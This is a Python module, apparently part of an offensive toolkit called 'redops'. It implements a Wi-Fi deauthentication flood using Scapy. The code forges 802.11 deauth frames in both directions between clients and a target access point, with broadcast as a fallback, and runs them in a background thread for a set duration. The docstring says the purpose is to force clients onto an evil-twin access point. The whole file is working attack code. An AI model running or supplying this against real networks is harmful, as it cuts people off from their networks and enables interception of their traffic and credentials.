"""
Deauth flood — forged 802.11 deauthentication frames.

Boots clients off legitimate AP so they reconnect to evil twin.
Requires: Scapy, monitor mode active.
"""

import threading
import time
from typing import Any

from redops.core.context import Context

try:
    from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp

    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

DEAUTH_REASON = 7


def deauth_flood(ctx: Context, params: dict[str, Any] | None = None) -> Context:
    """
    Send deauth frames to all clients on target BSSID.

    Params:
        duration: Flood duration in seconds. Default: 30
        count: Frames per burst. Default: 64
        interval: Seconds between bursts. Default: 0.1

    Adds to context:
        deauth_active: bool
        deauth_thread: thread handle
    """
    if not HAS_SCAPY:
        ctx.log("Scapy not installed, cannot run deauth", level="ERROR")
        ctx.add("deauth_active", False)
        return ctx

    params = params or {}
    duration = params.get("duration", 30)
    count = params.get("count", 64)
    interval = params.get("interval", 0.1)

    monitor_iface = ctx.get("monitor_interface", "wlan1mon")
    target_bssid = ctx.get("evil_twin_bssid")
    clients = ctx.get("clients", [])

    if not target_bssid:
        ctx.log("No target BSSID in context. Run evil_twin first.", level="ERROR")
        return ctx

    ctx.log(
        f"Starting deauth flood -> {target_bssid} for {duration}s",
        level="INFO",
    )

    def _flood() -> None:
        deadline = time.time() + duration
        target_clients = [
            c["mac"] for c in clients if c.get("associated_bssid") == target_bssid
        ] or ["ff:ff:ff:ff:ff:ff"]

        while time.time() < deadline:
            for client_mac in target_clients:
                # AP -> client
                pkt = (
                    RadioTap()
                    / Dot11(
                        addr1=client_mac,
                        addr2=target_bssid,
                        addr3=target_bssid,
                    )
                    / Dot11Deauth(reason=DEAUTH_REASON)
                )
                sendp(
                    pkt,
                    iface=monitor_iface,
                    count=count,
                    inter=0.001,
                    verbose=False,
                )

                # Client -> AP
                pkt2 = (
                    RadioTap()
                    / Dot11(
                        addr1=target_bssid,
                        addr2=client_mac,
                        addr3=target_bssid,
                    )
                    / Dot11Deauth(reason=DEAUTH_REASON)
                )
                sendp(
                    pkt2,
                    iface=monitor_iface,
                    count=count,
                    inter=0.001,
                    verbose=False,
                )

            time.sleep(interval)

        ctx.add("deauth_active", False)
        ctx.log("Deauth flood complete", level="INFO")

    t = threading.Thread(target=_flood, daemon=True)
    t.start()

    ctx.add("deauth_active", True)
    ctx.add("deauth_thread", t)
    return ctx
